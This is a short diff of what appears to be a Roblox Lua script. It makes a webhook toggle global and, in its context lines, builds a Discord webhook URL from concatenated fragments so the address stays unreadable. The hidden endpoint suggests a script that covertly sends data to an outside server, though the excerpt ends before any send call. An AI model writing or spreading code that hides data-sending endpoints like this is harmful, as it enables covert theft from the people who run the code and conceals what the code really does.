@@ -1,7 +1,7 @@
 repeat wait() until game:IsLoaded()
 local check = nil
 local sttsc = false
-local activewebhook = true
+activewebhook = true
 local bobby = "ht".."tps".."://dis"..
 "cor".."d.com".."/ap".."i/we"..
 "bho".."oks/104".."39900".."37206"..
